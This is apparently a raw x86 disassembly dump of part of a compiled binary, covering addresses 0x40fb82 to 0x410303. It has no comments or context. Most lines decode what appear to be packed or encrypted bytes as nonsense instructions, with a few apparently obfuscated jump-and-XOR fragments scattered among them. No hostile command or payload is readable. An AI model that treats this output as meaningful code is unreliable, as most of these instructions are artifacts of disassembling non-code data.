  40fb82:	scas   eax,DWORD PTR es:[edi]
  40fb83:	sahf   
  40fb84:	dec    edx
  40fb85:	mov    ds:0x7dafaea4,al
  40fb8a:	push   edx
  40fb8b:	test   DWORD PTR [edi+0x73c30ac1],ecx
  40fb91:	and    DWORD PTR [ebp+0x7d7d5a97],0xb475fef7
  40fb9b:	call   0x9c761dfc
  40fba0:	and    al,0xda
  40fba2:	sub    ch,BYTE PTR [ebx-0x54]
  40fba5:	cli    
  40fba6:	repz mov ds:0x1f65da62,eax
  40fbac:	pop    edi
  40fbad:	or     edx,ebx
  40fbaf:	lods   eax,DWORD PTR ds:[esi]
  40fbb0:	lods   al,BYTE PTR ds:[esi]
  40fbb1:	and    DWORD PTR [edi+ebx*2],ebx
  40fbb4:	pop    edi
  40fbb5:	mov    esi,0xbf9e1794
  40fbba:	mov    esp,DWORD PTR [ebx-0x1c393570]
  40fbc0:	fst    DWORD PTR [esi-0x18]
  40fbc3:	mov    esp,0x49033de1
  40fbc8:	pop    ecx
  40fbc9:	in     al,0x1
  40fbcb:	stc    
  40fbcc:	dec    ebx
  40fbcd:	xchg   edi,eax
  40fbce:	imul   esp,DWORD PTR [eax+0x74],0x57683b18
  40fbd5:	jne    0x40fc0f
  40fbd7:	push   ds
  40fbd8:	mov    esp,0x4b63b0b5
  40fbdd:	push   es
  40fbde:	ins    BYTE PTR es:[edi],dx
  40fbdf:	iret   
  40fbe0:	push   ss
  40fbe1:	data16 ja 0x40fc4d
  40fbe4:	cli    
  40fbe5:	lea    esi,[esi-0x53d4d947]
  40fbeb:	fcomp  DWORD PTR [esi+eax*4+0x41]
  40fbef:	scas   al,BYTE PTR es:[edi]
  40fbf0:	je     0x40fc3d
  40fbf2:	mov    cl,0xc4
  40fbf4:	(bad)  [ebx+edx*8]
  40fbf7:	fwait
  40fbf8:	(bad)  
  40fbf9:	pop    ss
  40fbfa:	inc    ecx
  40fbfb:	push   ecx
  40fbfc:	mov    edx,0x8d6b5937
  40fc01:	icebp  
  40fc02:	mov    cl,0x4a
  40fc04:	adc    DWORD PTR [esi+0x6f],0x16
  40fc08:	int3   
  40fc09:	jno    0x40fc39
  40fc0b:	mov    esp,DWORD PTR [esi+0x3e669a64]
  40fc11:	pusha  
  40fc12:	arpl   WORD PTR [edx+0x1a],di
  40fc15:	mov    ebp,ebp
  40fc17:	stos   BYTE PTR es:[edi],al
  40fc18:	imul   eax,DWORD PTR [edx],0x4
  40fc1b:	test   DWORD PTR [edx+0x7073739a],ebx
  40fc21:	dec    ecx
  40fc22:	cdq    
  40fc23:	jmp    0x60c931
  40fc28:	dec    BYTE PTR [ecx+ebp*4]
  40fc2b:	into   
  40fc2c:	bound  edi,QWORD PTR [edx]
  40fc2e:	cmp    al,0xc5
  40fc30:	rol    BYTE PTR [ebp+0x25],1
  40fc33:	jo     0x40fc29
  40fc35:	js     0x40fc98
  40fc37:	loop   0x40fbec
  40fc39:	push   esi
  40fc3a:	in     al,0x37
  40fc3c:	sahf   
  40fc3d:	xor    BYTE PTR [edx+0x5c0eb00f],bl
  40fc43:	sahf   
  40fc44:	popa   
  40fc45:	mov    al,0xf6
  40fc47:	sub    ecx,DWORD PTR [ebp-0x53]
  40fc4a:	sub    BYTE PTR [esi+edi*2-0x4e],cl
  40fc4e:	jl     0x40fc60
  40fc50:	pop    eax
  40fc51:	sub    eax,0x77b9cefd
  40fc56:	inc    esp
  40fc57:	sbb    dh,BYTE PTR [ecx-0x3b]
  40fc5a:	call   0x8043:0x582aa9a8
  40fc61:	push   edx
  40fc62:	xor    ebx,eax
  40fc64:	sbb    dl,BYTE PTR [eax+0x42]
  40fc67:	mov    ebx,0x7e9159ba
  40fc6c:	jns    0x40fbfc
  40fc6e:	ins    BYTE PTR es:[edi],dx
  40fc6f:	aad    0xf5
  40fc71:	cmp    al,0x99
  40fc73:	into   
  40fc74:	stc    
  40fc75:	pop    ecx
  40fc76:	mov    esp,0xdb3b3ffe
  40fc7b:	cwde   
  40fc7c:	xchg   ebp,eax
  40fc7d:	dec    eax
  40fc7e:	mov    al,ds:0xef27d408
  40fc83:	jecxz  0x40fc6a
  40fc85:	jmp    0x40fcc8
  40fc87:	neg    DWORD PTR [ecx]
  40fc89:	call   0x5f5e:0xa9333f7
  40fc90:	in     al,0xa3
  40fc92:	ins    BYTE PTR es:[edi],dx
  40fc93:	ret    
  40fc94:	cmp    eax,0xb3ef07b3
  40fc99:	and    eax,0xa2f3216a
  40fc9e:	push   edx
  40fc9f:	pusha  
  40fca0:	and    al,0xc5
  40fca2:	loopne 0x40fc5b
  40fca4:	sub    eax,0x36778bb
  40fca9:	ds inc esi
  40fcab:	mov    ds:0xcd96a9ef,eax
  40fcb0:	dec    ebx
  40fcb1:	mov    gs:0x36d8b15c,eax
  40fcb7:	in     al,0xf
  40fcb9:	or     eax,DWORD PTR [eax-0x7e]
  40fcbc:	test   BYTE PTR [esi+eax*8],dh
  40fcbf:	xchg   esp,eax
  40fcc0:	pop    ss
  40fcc1:	and    dh,ch
  40fcc3:	outs   dx,DWORD PTR ds:[esi]
  40fcc4:	dec    edx
  40fcc5:	push   esp
  40fcc6:	add    eax,0x64289eea
  40fccb:	pop    edx
  40fccc:	xor    al,0x8e
  40fcce:	jne    0x40fcfe
  40fcd0:	jo     0x40fd00
  40fcd2:	or     DWORD PTR [esi-0x28],ecx
  40fcd5:	pop    esp
  40fcd6:	cwde   
  40fcd7:	adc    DWORD PTR [ebx-0x49],eax
  40fcda:	fcom   QWORD PTR [ebp-0x45]
  40fcdd:	and    eax,0xe6ac000e
  40fce2:	xor    BYTE PTR [eax],ah
  40fce4:	imul   eax,ecx,0xff42ce91
  40fcea:	test   eax,0x1e6a462b
  40fcef:	jmp    0xdf9e:0x306cbeab
  40fcf6:	int3   
  40fcf7:	add    al,0xf8
  40fcf9:	jno    0x40fc9b
  40fcfb:	push   edi
  40fcfc:	(bad)  
  40fcfd:	lahf   
  40fcfe:	mov    ebx,0x96d11c07
  40fd03:	or     eax,0x5d842bea
  40fd08:	xchg   ecx,ebp
  40fd0a:	mov    bh,0x29
  40fd0c:	lock mov al,ds:0x861da8c0
  40fd12:	add    al,0xab
  40fd14:	imul   esi,DWORD PTR [ecx],0x6b
  40fd17:	(bad)
  40fd1b:	push   ebp
  40fd1c:	or     BYTE PTR [ecx+0x7],dl
  40fd1f:	add    eax,ebx
  40fd21:	cmp    ecx,eax
  40fd23:	jne    0x40fd46
  40fd29:	mov    eax,DWORD PTR [ebp-0x20]
  40fd2c:	inc    edi
  40fd2d:	cmp    edi,eax
  40fd2f:	jb     0x40e458
  40fd35:	jmp    0x40fd56
  40fd3a:	mov    eax,DWORD PTR [ebp-0x4]
  40fd3d:	xor    eax,esi
  40fd3f:	add    eax,ebx
  40fd41:	jmp    0x412238
  40fd46:	mov    eax,DWORD PTR [ebp-0x2c]
  40fd49:	movzx  eax,WORD PTR [eax+edi*2]
  40fd4d:	mov    ecx,DWORD PTR [ebp-0x14]
  40fd50:	mov    eax,DWORD PTR [ecx+eax*4]
  40fd53:	mov    DWORD PTR [ebp+0xc],eax
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp-0x8]
  40fd5c:	xor    eax,0x7510855
  40fd61:	add    eax,ebx
  40fd63:	jmp    0x410157
  40fd68:	xlat   BYTE PTR ds:[ebx]
  40fd69:	and    BYTE PTR [eax+eiz*8+0x73],ch
  40fd6d:	ins    BYTE PTR es:[edi],dx
  40fd6e:	push   ebx
  40fd6f:	aaa    
  40fd70:	pop    edx
  40fd71:	push   ecx
  40fd72:	push   ebx
  40fd73:	sahf   
  40fd74:	retf   0xa74b
  40fd77:	(bad)  
  40fd79:	mov    bh,0x70
  40fd7b:	jo     0x40fdc6
  40fd7d:	jge    0x40fdef
  40fd7f:	jo     0x40fd58
  40fd81:	hlt    
  40fd82:	stos   DWORD PTR es:[edi],eax
  40fd83:	sub    eax,DWORD PTR [ecx-0x7b]
  40fd86:	loope  0x40fd9a
  40fd88:	xchg   edx,eax
  40fd89:	in     eax,dx
  40fd8a:	pushf  
  40fd8b:	(bad)  
  40fd8d:	dec    edx
  40fd8e:	jbe    0x40fd17
  40fd90:	mov    ebp,0x19313b33
  40fd95:	daa    
  40fd96:	cwde   
  40fd97:	pop    esp
  40fd98:	dec    ecx
  40fd99:	sahf   
  40fd9a:	push   edx
  40fd9b:	and    ch,ch
  40fd9d:	aam    0xa9
  40fd9f:	mov    edi,0xadcff3f6
  40fda4:	fbstp  TBYTE PTR [eax]
  40fda6:	pop    esp
  40fda7:	stos   DWORD PTR es:[edi],eax
  40fda8:	stos   DWORD PTR es:[edi],eax
  40fda9:	mov    esp,0x104fc8fa
  40fdae:	push   ds
  40fdaf:	sbb    eax,0xea828999
  40fdb4:	jg     0x40fd56
  40fdb6:	inc    ebp
  40fdb7:	test   edi,eax
  40fdb9:	cwde   
  40fdba:	inc    eax
  40fdbb:	out    0x60,eax
  40fdbd:	sub    al,0xb1
  40fdbf:	(bad)  
  40fdc0:	les    ebp,FWORD PTR [edx]
  40fdc2:	push   edx
  40fdc3:	sub    DWORD PTR [esi+0x36ddeab1],esp
  40fdc9:	xchg   esp,eax
  40fdca:	push   es
  40fdcb:	int3   
  40fdcc:	xor    DWORD PTR [ecx+0xc1d08c9],ebx
  40fdd2:	mov    ds:0xe297f790,eax
  40fdd7:	popa   
  40fdd8:	stos   BYTE PTR es:[edi],al
  40fdd9:	xchg   esi,eax
  40fdda:	je     0x40fd68
  40fddc:	cli    
  40fddd:	jle    0x40fdd2
  40fddf:	cli    
  40fde0:	xor    dh,bl
  40fde2:	(bad)  
  40fde3:	icebp  
  40fde4:	inc    edi
  40fde5:	ffreep st(7)
  40fde7:	popf   
  40fde8:	(bad)  
  40fde9:	in     eax,0x53
  40fdeb:	dec    esp
  40fdec:	inc    ecx
  40fded:	xchg   esi,eax
  40fdee:	jmp    0x40fd97
  40fdf0:	push   edi
  40fdf1:	xor    ebp,DWORD PTR [edi]
  40fdf3:	test   al,0xd3
  40fdf5:	xchg   ecx,eax
  40fdf6:	sbb    ch,BYTE PTR [edx]
  40fdf8:	mov    ebx,0x3b70a6cf
  40fdfd:	repnz pop ebx
  40fdff:	repnz fmul st(0),st
  40fe02:	mov    ah,0x7
  40fe04:	cwde   
  40fe05:	mov    ebx,0x2f836093
  40fe0a:	pop    edx
  40fe0b:	dec    edi
  40fe0c:	jl     0x40fdae
  40fe0e:	hlt    
  40fe0f:	(bad)  
  40fe10:	test   BYTE PTR [edi],0x77
  40fe13:	test   ch,al
  40fe15:	fidiv  WORD PTR [edi+0x6b]
  40fe18:	pushf  
  40fe19:	or     eax,0xb40f20d6
  40fe1e:	xlat   BYTE PTR es:[ebx]
  40fe20:	jb     0x40fdba
  40fe22:	inc    ecx
  40fe23:	xchg   ebx,eax
  40fe24:	sbb    eax,0xafe4201
  40fe29:	inc    eax
  40fe2a:	loop   0x40fe36
  40fe2c:	sbb    DWORD PTR [esi],edx
  40fe2e:	or     BYTE PTR [edx],0x88
  40fe31:	xchg   ebp,eax
  40fe32:	fld    TBYTE PTR [ebx-0x3f]
  40fe35:	fs dec esp
  40fe37:	inc    edx
  40fe38:	outs   dx,BYTE PTR ds:[esi]
  40fe39:	(bad)  
  40fe3b:	out    dx,eax
  40fe3c:	add    al,0xa6
  40fe3e:	in     eax,0x73
  40fe40:	pop    edi
  40fe41:	inc    edx
  40fe42:	or     eax,0xd0cb0fdf
  40fe47:	xor    DWORD PTR [ecx],esi
  40fe49:	ins    BYTE PTR es:[edi],dx
  40fe4a:	aam    0x3e
  40fe4c:	xor    DWORD PTR [ebx],0xfffffff3
  40fe4f:	stos   BYTE PTR es:[edi],al
  40fe50:	inc    ebx
  40fe51:	dec    edx
  40fe52:	outs   dx,DWORD PTR ds:[esi]
  40fe53:	ret    
  40fe54:	js     0x40fe2e
  40fe56:	lods   al,BYTE PTR ds:[esi]
  40fe57:	fistp  DWORD PTR [ecx-0x31]
  40fe5a:	jmp    0x86026bac
  40fe5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe60:	stc    
  40fe61:	popf   
  40fe62:	add    BYTE PTR [eax+0x102efdf6],bl
  40fe68:	imul   eax,DWORD PTR [esi],0x71d5cbdb
  40fe6e:	stos   DWORD PTR es:[edi],eax
  40fe6f:	xchg   BYTE PTR [esi-0x2b],al
  40fe72:	inc    ebx
  40fe73:	sub    eax,0x620ad872
  40fe78:	push   cs
  40fe79:	scas   al,BYTE PTR es:[edi]
  40fe7a:	jmp    0x40fe98
  40fe7c:	cmp    al,BYTE PTR [ebx]
  40fe7e:	retf   0xa38f
  40fe81:	and    dh,BYTE PTR [esi-0x5e]
  40fe84:	imul   ecx,edx,0x36
  40fe87:	dec    esi
  40fe88:	aad    0x53
  40fe8a:	pushf  
  40fe8b:	jae    0x40fe7c
  40fe8d:	imul   ebp,DWORD PTR [ebp-0x1d],0x84b91875
  40fe94:	dec    ebx
  40fe95:	push   0x64
  40fe97:	fst    st(0)
  40fe99:	sbb    ecx,esp
  40fe9b:	push   esi
  40fe9c:	in     al,0x21
  40fe9e:	push   esp
  40fe9f:	mov    esi,0xce407961
  40fea4:	push   eax
  40fea5:	sub    eax,0xf050c911
  40feaa:	popf   
  40feab:	mov    ch,0xc6
  40fead:	jge    0x40fe8f
  40feaf:	pop    ebp
  40feb0:	add    edx,DWORD PTR [esi-0x1a]
  40feb3:	loope  0x40ff0c
  40feb5:	ret    
  40feb6:	xor    esp,ecx
  40feb8:	xchg   BYTE PTR [edi+0x1a],bh
  40febb:	pop    ebx
  40febc:	daa    
  40febd:	ret    0x3a95
  40fec0:	xor    esi,DWORD PTR [ebx+0x2a]
  40fec3:	mov    dl,0x9e
  40fec5:	mov    edi,0x1ba5ab72
  40feca:	cli    
  40fecb:	add    edi,DWORD PTR [ebp-0x10]
  40fece:	mov    edi,0x2ad38e7b
  40fed3:	adc    BYTE PTR [esi+0x6daefaa1],bh
  40fed9:	adc    BYTE PTR [edi],0x82
  40fedc:	dec    ebx
  40fedd:	leave  
  40fede:	imul   BYTE PTR [ebx-0x42]
  40fee1:	ds jb  0x40ff2b
  40fee4:	vmwrite edi,DWORD PTR es:[ecx+0xfd347ae]
  40feec:	and    esi,DWORD PTR [edi-0x3ee663c5]
  40fef2:	test   DWORD PTR [ebx+0x557632da],eax
  40fef8:	pop    ds
  40fef9:	stos   DWORD PTR es:[edi],eax
  40fefa:	bound  esi,QWORD PTR [ecx-0x7f]
  40fefd:	xlat   BYTE PTR ds:[ebx]
  40fefe:	ins    WORD PTR es:[edi],dx
  40ff00:	xor    eax,0xf707f6d3
  40ff05:	lods   al,BYTE PTR ds:[esi]
  40ff06:	pop    ds
  40ff07:	mov    dh,0x1c
  40ff09:	fs nop
  40ff0b:	aam    0xa
  40ff0d:	daa    
  40ff0e:	icebp  
  40ff0f:	adc    eax,0x2724aa1e
  40ff14:	mov    esp,cr4
  40ff17:	mov    ebx,0x35c64829
  40ff1c:	addr16 pusha 
  40ff1e:	sbb    DWORD PTR [ecx+0x63426374],ecx
  40ff24:	loope  0x40ff01
  40ff26:	xor    ebx,0x3e
  40ff29:	cwde   
  40ff2a:	sbb    esi,DWORD PTR [edi-0x3fc02619]
  40ff30:	rcl    DWORD PTR [ebx],cl
  40ff32:	popf   
  40ff33:	rol    DWORD PTR [esi+0x4f],1
  40ff36:	aam    0x89
  40ff38:	adc    ch,bh
  40ff3a:	repnz cs das 
  40ff3d:	or     al,0xb8
  40ff3f:	cmp    eax,0x699c17ee
  40ff44:	jbe    0x40ff2c
  40ff46:	fs inc edi
  40ff48:	and    DWORD PTR [edx],ebp
  40ff4a:	add    cl,BYTE PTR [ecx+0x2a]
  40ff4d:	push   cs
  40ff4e:	(bad)  
  40ff4f:	out    dx,eax
  40ff50:	shr    DWORD PTR [eax],cl
  40ff52:	add    DWORD PTR [edx],ecx
  40ff54:	dec    ebp
  40ff55:	mov    WORD PTR [edi+0x778994a5],?
  40ff5b:	fcomp  DWORD PTR [esi+0x368eacf0]
  40ff61:	repnz fld DWORD PTR [esi+0x5951bab2]
  40ff68:	adc    eax,0xeaa6462b
  40ff6d:	adc    BYTE PTR [edx+0x70ab525a],bh
  40ff73:	bound  edi,QWORD PTR [ebx+esi*1-0x3a37b47d]
  40ff7a:	fdivr  QWORD PTR [esi+0x28]
  40ff7d:	daa    
  40ff7e:	cmp    eax,esi
  40ff80:	push   eax
  40ff81:	mov    al,0x5a
  40ff83:	mov    ebp,0x51a11607
  40ff88:	adc    DWORD PTR [eax+0x67b8b095],ebp
  40ff8e:	popf   
  40ff8f:	inc    ebp
  40ff90:	pusha  
  40ff91:	pusha  
  40ff92:	sub    BYTE PTR ds:[ebp-0x25],cl
  40ff96:	gs call 0x55eb2e3a
  40ff9c:	push   0x13
  40ff9e:	jb     0x40ff84
  40ffa0:	outs   dx,DWORD PTR ds:[esi]
  40ffa1:	xchg   ebx,eax
  40ffa2:	hlt    
  40ffa3:	pop    ds
  40ffa4:	repz mov eax,0x6b650d6d
  40ffaa:	jg     0x40ff5e
  40ffac:	and    eax,0x6cdffacb
  40ffb1:	add    DWORD PTR [edx+0x3b],ebx
  40ffb4:	shl    DWORD PTR [esi+0x67],1
  40ffb7:	popf   
  40ffb8:	add    eax,0x34851dfc
  40ffbd:	leave  
  40ffbe:	adc    DWORD PTR [esi-0x483ebd9d],edi
  40ffc4:	out    dx,al
  40ffc5:	cmp    DWORD PTR [edx-0xa],edx
  40ffc8:	ret    0x83b6
  40ffcb:	mov    ss,WORD PTR [eax+0x1a]
  40ffce:	aam    0x16
  40ffd0:	mov    ds:0x230bb2a3,al
  40ffd5:	jmp    0x40fff3
  40ffd7:	fiadd  WORD PTR [eax]
  40ffd9:	js     0x40ffcc
  40ffdb:	mov    cl,BYTE PTR [esp+ecx*1]
  40ffde:	cli    
  40ffdf:	stc    
  40ffe0:	scas   al,BYTE PTR es:[edi]
  40ffe1:	pop    ds
  40ffe2:	mov    ah,0xaa
  40ffe4:	cmp    eax,0xf928a9b7
  40ffe9:	inc    edi
  40ffea:	arpl   WORD PTR [esi+eiz*1+0x21],bp
  40ffee:	idiv   ah
  40fff0:	jne    0x41006e
  40fff2:	mov    esp,0x9e08f0ac
  40fff7:	es ret 0x2100
  40fffb:	repz cmp eax,0x4d2e7f74
  410001:	xchg   ecx,eax
  410002:	xchg   BYTE PTR [eax],ah
  410004:	jbe    0x410025
  410006:	je     0x40ffdc
  410008:	scas   al,BYTE PTR es:[edi]
  410009:	(bad)  
  41000a:	dec    edx
  41000b:	or     dl,ch
  41000d:	(bad)  
  41000e:	dec    ecx
  41000f:	sub    BYTE PTR [eax+0x3625c41],0x9
  410016:	imul   bl
  410018:	adc    ch,BYTE PTR [ecx-0x593b7602]
  41001e:	add    DWORD PTR [edx+edx*1+0x21fb692b],esp
  410025:	loope  0x40ffff
  410027:	add    ebx,0xffffff9f
  41002a:	loope  0x40ffeb
  41002c:	sbb    edi,DWORD PTR [ebx]
  41002e:	add    BYTE PTR [esi+0x3cac8317],ch
  410034:	pop    ebx
  410035:	popa   
  410036:	out    dx,eax
  410037:	mov    dh,BYTE PTR [edi+0x1378540]
  41003d:	test   al,0x47
  41003f:	shl    BYTE PTR [ebx],0x37
  410042:	cdq    
  410043:	hlt    
  410044:	fs adc ch,al
  410047:	inc    ebx
  410048:	scas   al,BYTE PTR es:[edi]
  410049:	cmp    eax,0xf3c9d6e4
  41004e:	sar    DWORD PTR [esi+0x76d92fdc],cl
  410054:	mov    dl,0x25
  410056:	shl    ecx,1
  410058:	cmp    al,BYTE PTR [edi+edx*2]
  41005b:	or     al,0x72
  41005d:	imul   ecx,DWORD PTR [eax-0x71],0x17
  410061:	jecxz  0x4100e2
  410063:	les    ebx,FWORD PTR [eax-0x63]
  410066:	cdq    
  410067:	(bad)  
  410068:	(bad)  
  410069:	loop   0x410018
  41006b:	aas    
  41006c:	fwait
  41006d:	(bad)  
  41006f:	inc    edx
  410070:	mov    edi,0x2b865a11
  410075:	jecxz  0x4100c6
  410077:	out    0xd6,al
  410079:	push   ebp
  41007a:	sbb    BYTE PTR [edi],0x5e
  41007d:	adc    DWORD PTR [esi+0x70],eax
  410080:	in     al,dx
  410081:	neg    edx
  410083:	out    0x45,al
  410085:	and    DWORD PTR [ebp+0x19f9e70e],ebx
  41008b:	imul   eax,DWORD PTR [esi],0x75
  41008e:	pop    eax
  41008f:	stos   BYTE PTR es:[edi],al
  410090:	stos   DWORD PTR es:[edi],eax
  410091:	hlt    
  410092:	les    esp,FWORD PTR [ebx]
  410094:	jns    0x4100d9
  410096:	fwait
  410097:	stc    
  410098:	or     BYTE PTR [edi+0x54abb7c1],bl
  41009e:	mov    esi,ebx
  4100a0:	in     al,dx
  4100a1:	dec    ebx
  4100a2:	mov    ebx,0x49585761
  4100a7:	es mov bh,0x35
  4100aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100ab:	mov    ds:0x4d626bc6,al
  4100b0:	lahf   
  4100b1:	mov    eax,0xfb684f92
  4100b6:	xlat   BYTE PTR ds:[ebx]
  4100b7:	sbb    BYTE PTR ds:[eax+0xf],al
  4100bb:	sub    BYTE PTR [esi-0x14726923],cl
  4100c1:	pop    esp
  4100c2:	sub    dl,BYTE PTR ds:0x59a699ab
  4100c8:	jnp    0x410108
  4100ca:	pop    ebx
  4100cb:	imul   edx,DWORD PTR [eax],0xffffffcb
  4100ce:	repz sub bl,dl
  4100d1:	int3   
  4100d2:	pusha  
  4100d3:	adc    bh,ch
  4100d5:	and    eax,0xbbeffb10
  4100da:	inc    esi
  4100db:	mov    DWORD PTR [ebx-0xf282d7],eax
  4100e1:	ret    
  4100e2:	jo     0x41011b
  4100e4:	pop    ebx
  4100e5:	push   0x49e3e2a9
  4100ea:	jb     0x4100a9
  4100ec:	imul   edx,DWORD PTR [edx+0x2ea2d400],0xc
  4100f3:	mov    ah,0xcc
  4100f5:	call   0xcdbd6f67
  4100fa:	cmp    eax,0x4e95feff
  4100ff:	push   es
  410100:	lahf   
  410101:	mov    ch,BYTE PTR [esi+0x60]
  410104:	les    ebx,FWORD PTR [ebx+ebp*8-0x772361b4]
  41010b:	jnp    0x410090
  41010d:	arpl   WORD PTR [esi+0x23],si
  410110:	jbe    0x410119
  410112:	mov    bh,0xf0
  410114:	pop    edi
  410115:	pop    esi
  410116:	mov    ebp,0x36ff0e35
  41011b:	jb     0x4100e0
  41011d:	mov    cl,0x5
  41011f:	ins    BYTE PTR es:[edi],dx
  410120:	jp     0x41012a
  410122:	scas   al,BYTE PTR es:[edi]
  410123:	lods   eax,DWORD PTR ds:[esi]
  410124:	sbb    DWORD PTR [esi-0x3c],ebp
  410127:	jg     0x410109
  410129:	nop    DWORD PTR ds:0xdb1fa78b
  410130:	mov    dl,0x68
  410132:	and    cl,BYTE PTR [esi-0x6c]
  410135:	mov    cl,0x1
  410137:	mov    ds:0x1076da9a,al
  41013c:	mov    dl,0x98
  41013e:	les    edi,FWORD PTR [eax-0x3eb61b10]
  410144:	dec    ecx
  410145:	xor    al,0xbc
  410147:	out    0x8c,eax
  410149:	adc    DWORD PTR [eax+0xc0aff31],ebp
  41014f:	pop    esp
  410150:	cmp    DWORD PTR ds:0x1198db6c,ecx
  410156:	dec    ebp
  410157:	cmp    ecx,eax
  410159:	jne    0x41016c
  41015f:	mov    eax,DWORD PTR [ebp-0x4]
  410162:	xor    eax,0x7510855
  410167:	jmp    0x40fd3f
  41016c:	mov    eax,DWORD PTR [ebp+0xc]
  41016f:	add    eax,DWORD PTR [ebp+0x8]
  410172:	mov    DWORD PTR [ebp-0x10],eax
  410175:	mov    eax,DWORD PTR [ebp-0x1c]
  410178:	jmp    0x41056c
  41017d:	sahf   
  41017e:	das    
  41017f:	or     ah,BYTE PTR [edi]
  410181:	mov    DWORD PTR [ecx],esp
  410183:	mov    cl,0xb5
  410185:	pop    es
  410186:	mov    BYTE PTR [ebx],bl
  410188:	(bad)  
  410189:	mov    ecx,0x3146f691
  41018e:	mov    bl,0x70
  410190:	jo     0x4101db
  410192:	jge    0x410204
  410194:	jo     0x4101e3
  410196:	arpl   WORD PTR [ebx],bx
  410198:	pop    esi
  410199:	retf   0x75cb
  41019c:	stos   BYTE PTR es:[edi],al
  41019d:	hlt    
  41019e:	inc    esp
  41019f:	lock xlat BYTE PTR ds:[ebx]
  4101a1:	fadd   DWORD PTR es:[ecx+edi*1+0x5e3dd4ff]
  4101a9:	mov    edx,0x249539da
  4101ae:	(bad)  
  4101af:	adc    ah,bl
  4101b1:	lods   al,BYTE PTR ds:[esi]
  4101b2:	wrmsr  
  4101b4:	xchg   ebp,eax
  4101b5:	jle    0x41016f
  4101b7:	mov    ecx,0xd528a33a
  4101bc:	(bad)  
  4101bd:	sbb    eax,0x1944db2d
  4101c2:	jmp    0xf1b1:0x7a99d735
  4101c9:	dec    ebx
  4101ca:	ret    0x3189
  4101cd:	mov    esp,0xb75911be
  4101d2:	push   ebx
  4101d3:	sub    DWORD PTR [eax+eiz*2],esp
  4101d6:	push   ebx
  4101d7:	dec    esi
  4101d8:	jnp    0x4101c8
  4101da:	pop    esp
  4101db:	mov    al,0x56
  4101dd:	fbld   TBYTE PTR [ebp-0x7]
  4101e0:	imul   ebp,edx,0x15c88028
  4101e6:	inc    ebx
  4101e7:	sti    
  4101e8:	sub    ch,0x61
  4101eb:	outs   dx,DWORD PTR ds:[esi]
  4101ec:	fsub   QWORD PTR ds:0x411f413e
  4101f2:	or     ebp,DWORD PTR [edi-0x2c]
  4101f5:	or     DWORD PTR [eax],0x2e
  4101f8:	ja     0x4101a4
  4101fa:	jl     0x41020f
  4101fc:	push   ebp
  4101fd:	xor    al,0x89
  4101ff:	mov    dl,0xd3
  410201:	add    DWORD PTR [ebx+ebp*8],edx
  410204:	push   cs
  410205:	das    
  410206:	enter  0x5a8f,0xd2
  41020a:	popf   
  41020b:	shr    DWORD PTR [edi+0x7d],cl
  41020e:	mov    bh,0xb
  410210:	add    al,0xb3
  410212:	cdq    
  410213:	mov    ecx,DWORD PTR [edx-0x469b37f3]
  410219:	mov    ch,BYTE PTR [edi+0x27b5b544]
  41021f:	inc    edx
  410220:	sub    bh,BYTE PTR [edi+0x41]
  410223:	ss pop ss
  410225:	lock cmc 
  410227:	xchg   edi,eax
  410228:	lods   al,BYTE PTR ds:[esi]
  410229:	int3   
  41022a:	adc    eax,0xc6c3c54a
  41022f:	adc    dh,BYTE PTR [edx]
  410231:	sti    
  410232:	in     eax,dx
  410233:	cdq    
  410234:	mov    edi,0x70da73f7
  410239:	cdq    
  41023a:	test   eax,0xd1bdb8ea
  41023f:	dec    edx
  410240:	fmul   DWORD PTR [ebp+0x4d9a484b]
  410246:	jns    0x4101d5
  410248:	and    eax,0x492c3d7f
  41024d:	mov    ds:0xb4b32d6,eax
  410252:	shl    BYTE PTR [ecx],1
  410254:	das    
  410255:	ja     0x4102ce
  410257:	loope  0x410220
  410259:	lods   al,BYTE PTR ds:[esi]
  41025a:	(bad)  
  41025b:	fisub  DWORD PTR [ebx-0x5b9a3cea]
  410261:	lea    ebx,[edi-0x15]
  410264:	mov    bl,0xc4
  410266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410267:	in     eax,dx
  410268:	stos   DWORD PTR es:[edi],eax
  410269:	sub    DWORD PTR [edx],ecx
  41026b:	cld    
  41026c:	scas   al,BYTE PTR es:[edi]
  41026d:	xchg   ebp,eax
  41026e:	sbb    bl,cl
  410270:	test   dl,dh
  410272:	repnz sbb al,0x43
  410275:	dec    edi
  410276:	inc    ecx
  410277:	sar    BYTE PTR [esi+0x3006b100],cl
  41027d:	loope  0x410210
  41027f:	sub    eax,0xa78b1141
  410284:	push   ebp
  410285:	xor    DWORD PTR [eax],edi
  410287:	nop
  410288:	loop   0x41026c
  41028a:	mov    edx,0xb60405aa
  41028f:	ins    BYTE PTR es:[edi],dx
  410290:	daa    
  410291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410292:	movhps QWORD PTR [edx-0x32],xmm3
  410296:	loopne 0x4102aa
  410298:	adc    cl,al
  41029a:	in     al,dx
  41029b:	cmc    
  41029c:	or     al,0xa9
  41029e:	add    esi,DWORD PTR [edx-0x421ece09]
  4102a4:	and    BYTE PTR [esi],dl
  4102a6:	jns    0x41027b
  4102a8:	push   ss
  4102a9:	mov    esi,0xc83741a1
  4102ae:	xor    al,BYTE PTR [eax+edi*4]
  4102b1:	adc    eax,0xa0e7e169
  4102b6:	cmp    dl,BYTE PTR [edx+0x11]
  4102b9:	stc    
  4102ba:	and    DWORD PTR [ebx-0x75],esi
  4102bd:	mov    bl,0x9
  4102bf:	aaa    
  4102c0:	bound  eax,QWORD PTR ds:0xec61afc8
  4102c6:	ds jns 0x41024d
  4102c9:	jecxz  0x4102cc
  4102cb:	add    DWORD PTR [esi+0x4f34a132],edi
  4102d1:	daa    
  4102d2:	fcomip st,st(1)
  4102d4:	in     al,0x1a
  4102d6:	push   ds
  4102d7:	lahf   
  4102d8:	inc    edx
  4102d9:	fdiv   DWORD PTR [edi+0x2d80ac1c]
  4102df:	inc    eax
  4102e0:	mov    bl,0x65
  4102e2:	mov    bh,0x5
  4102e4:	cmp    ah,cl
  4102e6:	xor    eax,DWORD PTR [esi-0x6c]
  4102e9:	adc    dh,bl
  4102eb:	leave  
  4102ec:	xor    DWORD PTR [ecx-0x50ccda6e],ecx
  4102f2:	mov    eax,ds:0x7b770e3d
  4102f7:	and    al,bl
  4102f9:	or     bh,bh
  4102fb:	int3   
  4102fc:	lock imul edx,DWORD PTR [ebx],0xfa86da7f
  410303:	ja     0x4102ac
